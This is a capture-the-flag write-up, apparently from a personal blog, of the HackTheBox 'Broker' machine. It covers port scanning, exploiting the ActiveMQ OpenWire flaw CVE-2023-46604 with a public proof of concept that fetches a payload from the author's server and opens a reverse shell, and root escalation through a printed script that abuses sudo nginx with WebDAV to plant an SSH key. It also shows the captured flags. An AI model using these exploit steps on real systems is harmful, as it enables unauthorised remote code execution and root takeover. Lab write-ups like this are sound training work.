---
title: Broker - HackTheBox
date: 2025-01-12
tags:
  - hackthebox
  - linux
---
# Broker - HackTheBox

![Image Description](/images/Pasted%20image%2020260112112319.png)

<!--more-->
## Enumeration

Let's start with a simple port scan:

```
nmap -sC -sV -v 10.129.230.87

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I am looking for an ActiveMQ service, which wasn't revealed by this scan. Let's include more ports in a second scan:

```
nmap -sC -sV -v 10.129.230.87 --top-ports 10000

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|_    ActiveMQ/Advisory/Consumer/Topic/#: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Error 401 Unauthorized
39489/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
```

Ok, looks like it's running on 61616 and is version 5.15.15. Let's search for a CVE before we go any further.

## Research On CVE

I found this from https://activemq.apache.org/news/cve-2023-46604:

>The Java OpenWire protocol marshaller is vulnerable to Remote Code Execution. This vulnerability may allow a remote attacker with network access to either a Java-based OpenWire broker or client to run arbitrary shell commands by manipulating serialized class types in the OpenWire protocol to cause either the client or the broker (respectively) to instantiate any class on the classpath.

## Initial Foothold

Let's look up some POC's in metasploit

```
msf > search "cve-2023-46604"

Matching Modules
================

   #  Name                                                   Disclosure Date  Rank       Check  Description
   -  ----                                                   ---------------  ----       -----  -----------
   0  exploit/multi/misc/apache_activemq_rce_cve_2023_46604  2023-10-27       excellent  Yes    Apache ActiveMQ Unauthenticated Remote Code Execution
   1    \_ target: Windows                                   .                .          .      .
   2    \_ target: Linux                                     .                .          .      .
   3    \_ target: Unix                                      .                . 
```

Metasploit isn't working for me. I'll quickly try [this github repo](https://github.com/rootsecdev/CVE-2023-46604) and see if we I can get RCE.

Set up a server:

```
python -m http.server 8080
```

And run the script:

```
david@red:~/Pentest/tools/CVE-2023-46604$ go run main.go -i 10.129.230.87 -p 61616 -u http://10.10.17.8:8080/poc-linux.xml
     _        _   _           __  __  ___        ____   ____ _____ 
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.129.230.87:61616
[*] XML URL: http://10.10.17.8:8080/poc-linux.xml

[*] Sending packet: 000000771f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010024687474703a2f2f31302e31302e31372e383a383038302f706f632d6c696e75782e786d6c
```

I also needed to edit the xml file to include my ip address, plus start a netcat listener on 9001... and I'm IN!

## Recon

Let's upgrade the terminal... there's no python on the box, so we'll settle for this:

`script -q /dev/null /bin/bash`

Running some basic commands:

```
activemq@broker:/opt/apache-activemq-5.15.15/bin$ id; whoami; pwd
id; whoami; pwd
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
activemq
/opt/apache-activemq-5.15.15/bin
activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
activemq@broker:/opt/apache-activemq-5.15.15/bin$
```

So we're in the bin directory. Also, we can run /usr/sbin/nginx as root! Useful for later. For now, I'll capture the user flag and see which direction the hints guide me in.

```
cd /home
activemq@broker:/home$ dir
dir
activemq
activemq@broker:/home$ cd activemq
cd activemq
activemq@broker:~$ dir
dir
user.txt
activemq@broker:~$ cat user.txt
cat user.txt
982d41ffdbb22dae7420ee5c58cf2a3a
activemq@broker:~$ 
```

## Privesc

Turns out my nose was in the right place - the next hint asks for a binary activemq can run as any other user with sudo (`/usr/sbin/nginx`).

I'm going to quickly search sites like GTFOBins for nginx.

Can we just use this? https://github.com/DylanGrl/nginx_sudo_privesc

Yes, it's that simple. I'm going to try and understand it - it leverages webdav...

Analysing the script - we run nginx as root, use that to add an SSH key to the root user, then simply run SSH with our added key. I'll need to tweak this slightly for the current environment:

```
#!/bin/sh
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	        listen 1339;
	        root /;
	        autoindex on;
	        dav_methods PUT;
	}
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat .ssh/id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
echo "[+] Use the SSH key to get access"
```

Let's do it manually. First, I'll create the config file on the server.

Next, running the server, I see this error: 

```
sudo nginx -c /tmp/nginx_pwn.conf
nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
nginx: [emerg] still could not bind()
activemq@broker:/tmp$ 
```

Hmm, let's ChatGPT the issue. Maybe nginx is already running? Maybe I need to specify a different ip address?

>That error means **nginx cannot bind to port `1339` because the port is already in use (or otherwise unavailable)**.

I retried on port 5566... this ran with no message the first time, then gave back an error the second time. This SUGGESTS that the process is already running. I should have run a process check.

I can do better than that! Let's use `netstat` to confirm my hypothesis:

```
activemq@broker:~/.ssh$ netstat -tuln
netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:5566            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:1339            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp6       0      0 :::5672                 :::*                    LISTEN     
tcp6       0      0 :::8161                 :::*                    LISTEN     
tcp6       0      0 :::1883                 :::*                    LISTEN     
tcp6       0      0 :::39489                :::*                    LISTEN     
tcp6       0      0 :::61616                :::*                    LISTEN     
tcp6       0      0 :::61613                :::*                    LISTEN     
tcp6       0      0 :::61614                :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp        0      0 0.0.0.0:68              0.0.0.0:*                          
activemq@broker:~/.ssh$ 
```

I see stuff running on those ports. Good enough for me. I proceeded with the other exploit commands... now we'll store the generated ssh key and use it to connect to our host.

```
chmod 600 root_key
ssh -i root_key root@10.129.230.87
```

I GOT IT! I am now in... but now without tribulation. I tried to use ssh as activemq on the broker machine, and it didn't work. It worked when I copied it to my local machine and used it. Why?

Ahh... I could have used `ssh root@localhost`, silly me. Nonetheless, we got there!

```
david@red:~/Downloads$ ssh -i root_key root@10.129.230.87
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 12 12:41:04 PM UTC 2026

  System load:           0.0
  Usage of /:            70.8% of 4.63GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             169
  Users logged in:       0
  IPv4 address for eth0: 10.129.230.87
  IPv6 address for eth0: dead:beef::250:56ff:fe94:2d6b

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

root@broker:~# ls
cleanup.sh  root.txt
root@broker:~# cat root.txt
e2855ba2ff137a93257a15d3a40b1621
root@broker:~# 
```

## Reflection
- Using this blog makes me better at thinking things through... I will continue to do so
- I liked how I decided to use the privilege escalation Github repo step-by-step
- I could have privesced way quicker by remembering to ssh to localhost!